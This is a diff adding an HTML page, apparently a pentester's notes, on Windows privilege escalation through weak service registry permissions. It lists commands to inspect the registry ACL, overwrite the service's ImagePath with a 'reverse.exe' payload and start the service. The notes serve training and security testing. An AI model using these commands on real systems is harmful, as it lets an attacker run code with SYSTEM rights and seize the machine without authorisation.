@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>Weak Registry Permissions (Overwrite D-Word)</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>Weak Registry Permissions (Overwrite D-Word)</h1><br/>Weak Registry Permissions<br />	The Windows registry stores entries for each service. Since registry entries can have ACLs, if the ACL is misconfigured, it may be possible to modify a service’s configuration even if we cannot modify the 	service directly. This can be verified with either...<br /><br />	PS&gt; Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List<br />	---or---<br />	&gt; .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\ServiceRegKey<br /><br />	Overwrite the d-word and start the service<br /><br />	reg query HKLM\SYSTEM\CurrentControlSet\services\ServiceRegKey<br />	reg add HKLM\SYSTEM\CurrentControlSet\services\ServiceRegKey /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f<br />	sc start ServiceReg </div></body></html>
